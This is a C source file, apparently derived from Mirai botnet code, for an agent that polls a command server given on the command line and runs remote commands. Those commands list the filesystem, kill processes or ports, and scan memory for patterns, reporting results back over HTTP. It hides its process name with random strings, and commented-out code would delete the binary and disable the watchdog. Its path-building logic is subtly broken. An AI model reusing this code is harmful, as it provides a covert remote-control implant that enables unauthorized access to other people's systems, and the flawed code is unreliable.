#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <netinet/tcp.h>
#include <dirent.h>

#include "includes.h"
#include "killer.h"
#include "rand.h"
#include "util.h"

#define HTTP_SERVER "127.0.0.1"
#define HTTP_PORT htons(8080)
#define BUFFER_SIZE 1024

int fd_ctrl = -1;

int socket_connect(char* ip, int port){
  struct hostent *hp;
  struct sockaddr_in addr;
  int sock = -1;     
  addr.sin_addr.s_addr = inet_addr(ip);
  addr.sin_port = htons(port);
  addr.sin_family = AF_INET;
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if(sock == -1){
    return -1;
  }
  if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) < 0){
    return -1;
  }
  return sock;
}

void list_dir(char *name, int level){
  DIR *dir;
  struct dirent *entry;
  struct mntent *ent;

  if (!(dir = opendir(name)))
    return;
  if (!(entry = readdir(dir)))
    return;

  do{
    if (entry->d_type == DT_DIR) {
      char path[1024];
      util_strcpy(path, name);
      util_strcpy(path + util_strlen(path), "/");
      util_strcpy(path, entry->d_name);
      int len = 1 + util_strlen(name) + util_strlen(entry->d_name);
      path[len] = 0;
      if (util_strcmp(entry->d_name, ".") == 0 || util_strcmp(entry->d_name, "..") == 0)
        continue;
      write(2, entry->d_name, util_strlen(entry->d_name));
      list_dir(path, level + 1);
    }
    else{
      write(2, entry->d_name, util_strlen(entry->d_name));
    }
  } while (entry = readdir(dir));
  closedir(dir);
}
int util_first_before_split(char* input, char delimiter){
  int count = 0;
  while(input && input[count] != delimiter){
    count++;
  }
  return count;
}
int list_procs(){
  DIR* dir;
  struct dirent* ent;
  char buf[512];
  char payload[512];
  char path[512];
  if (!(dir = opendir("/proc"))) {
    return -1;
  }

  while((ent = readdir(dir)) != NULL) {
    if(!util_isdigit(*ent->d_name))
        continue;
    char* pid = ent->d_name;
    util_zero(payload, 512);
    util_strcpy(payload, pid);
    util_strcpy(payload + util_strlen(payload), " ");
    util_strcpy(buf, "/proc/");
    util_strcpy(buf + util_strlen(buf), pid);
    util_strcpy(buf + util_strlen(buf), "/cmdline");
    int fh = open(buf,O_RDONLY);
    read(fh,path,512);
    close(fh);
    int bin_len = util_first_before_split(path, ' '); 
    util_zero(buf, 512);
    int i = 0;
    for(i = 0 ; i < bin_len && i < 512 && buf[i] != ' '; ++i)
      buf[i] = path[i];
    util_strcpy(payload + util_strlen(payload), buf);
    write(2, payload, util_strlen(payload));
    write(2, "\n", 1);
     
  }
  closedir(dir);
  return -1;
}

 
int heartbeat(char* ip, int port){
  int fd;
  char buffer[BUFFER_SIZE];
  unsigned int header_parser = 0;
  
  while(1){
    sleep(5);
    fd = socket_connect(ip, port); 
    if(fd < 0){
      write(2, "CFAIL\n", 6);
      continue;
    }
    header_parser = 0;
    write(2, "Heartbeat\n", 10);
    char req[25] = "GET /status/heartbeat\r\n\r\n";
    if(write(fd, req, util_strlen(req)) != util_strlen(req)){
      write(2, "RFAIL\n", 6);
      continue;
    } 
    util_zero(buffer, BUFFER_SIZE);

    while(1){
      int ret = read(fd, buffer, BUFFER_SIZE - 1);
      if(ret <= 0)
        break;
      write(2, buffer, ret);
    }
    write(2, "\n", 1);
    if(util_strcmp(buffer, "list_procs") == TRUE){
      write(2, "list proc\n", 10);
      //list_procs();
    }else if(util_strcmp(buffer, "list_dir") == TRUE){
      write(2, "list dir\n", 9);
      list_dir("/", 0);
    }else if(util_strncmp(buffer,"kill_port", 9) == TRUE){
      int idx = 0;
      while(buffer[idx] && buffer[idx] != ' ' ) ++idx;
      ++idx;
      write(2, buffer + idx, util_strlen(buffer + idx));
      write(2, "\n", 1);
      int port = util_atoi(buffer + idx, 10);
      kill_port(htons(port));  
    }else if(util_strncmp(buffer,"kill_proc", 9) == TRUE){
      int idx = 0;
      write(2, "kill_proc", 9);
      while(buffer[idx] && buffer[idx] != ' ' ) ++idx;
      ++idx;
      write(2, buffer + idx, util_strlen(buffer + idx));
      int pid = util_atoi(buffer + idx, 10);
      kill_pid(pid);  
    }else if(util_strncmp(buffer,"find_pattern", 12) == TRUE){
      int idx = 0;
      while(buffer[idx] && buffer[idx] != ' ' ) ++idx;
      ++idx;
      write(2, "Searching pattern ", 18);
      write(2, buffer + idx, util_strlen(buffer + idx));
      write(2, "\n", 1);
      pid_t res_pid = find_pattern(buffer + idx);  
      char res_str[256] = {};
      char* pid_str = util_itoa(res_pid, 10, res_str);
      write(2, pid_str, util_strlen(pid_str));
      char patt_req[256] = "GET /forensics/mem_scan&pid=";
      util_strcpy(patt_req + util_strlen(patt_req), pid_str);
      util_strcpy(patt_req + util_strlen(patt_req), "\r\n\r\n");
      int resp_fd = socket_connect(ip, port); 
      write(resp_fd, patt_req, util_strlen(patt_req));
      shutdown(resp_fd, SHUT_RDWR); 
      resp_fd = -1;
    }
    shutdown(fd, SHUT_RDWR); 
    close(fd); 
    fd = -1;
  }

  return 0;
}

int main(int argc, char **args) {
  char *tbl_exec_succ;
  char name_buf[32];
  char id_buf[32];
  int name_buf_len;
  int tbl_exec_succ_len;
  int pgid, pings = 0;

  sigset_t sigs;
  int wfd;
  if(argc < 3){
    write(2, "Invalid usage\n", 14);
    return 1;
  }
  
  // Delete self
  // unlink(args[0]);

  /*if ((wfd = open("/dev/watchdog", 2)) != -1 ||
      (wfd = open("/dev/misc/watchdog", 2)) != -1) {
    int one = 1;
    ioctl(wfd, 0x80045704, &one);
    close(wfd);
    wfd = 0;
  }*/
  //chdir("/");

  //ensure_single_instance();

  rand_init();

  /*// Hide argv0
  name_buf_len = ((rand_next() % 4) + 3) * 4;
  rand_alphastr(name_buf, name_buf_len);
  name_buf[name_buf_len] = 0;
  util_strcpy(args[0], name_buf);
  */
  // Hide process name
  name_buf_len = ((rand_next() % 6) + 3) * 4;
  rand_alphastr(name_buf, name_buf_len);
  name_buf[name_buf_len] = 0;
  prctl(PR_SET_NAME, name_buf);

  write(2, "Start heartbeat\n", 16);
  heartbeat(args[1], atoi(args[2]));

  return 0;
}

static void ensure_single_instance(void) {
  static BOOL local_bind = TRUE;
  struct sockaddr_in addr;
  int opt = 1;

  if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
  setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
  fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127, 0, 0, 1)) : LOCAL_ADDR;
  addr.sin_port = htons(SINGLE_INSTANCE_PORT);

  errno = 0;
  if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) ==
      -1) {
    if (errno == EADDRNOTAVAIL && local_bind) local_bind = FALSE;
#ifdef DEBUG
    printf(
        "[main] Another instance is already running (errno = %d)! Sending kill "
        "request...\r\n",
        errno);
#endif
    // Reset addr just in case
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    if (connect(fd_ctrl, (struct sockaddr *)&addr,
                sizeof(struct sockaddr_in)) == -1) {
#ifdef DEBUG
      printf(
          "[main] Failed to connect to fd_ctrl to request process "
          "termination\n");
#endif
    }
    sleep(5);
    close(fd_ctrl);
    kill_port(htons(SINGLE_INSTANCE_PORT));
    ensure_single_instance();  // Call again, so that we are now the control
  } else {
    if (listen(fd_ctrl, 1) == -1) {
#ifdef DEBUG
      printf("[main] Failed to call listen() on fd_ctrl\n");
      close(fd_ctrl);
      sleep(5);
      kill_port(htons(SINGLE_INSTANCE_PORT));
      ensure_single_instance();
#endif
    }
#ifdef DEBUG
    printf("[main] We are the only process on this system!\n");
#endif
  }
}
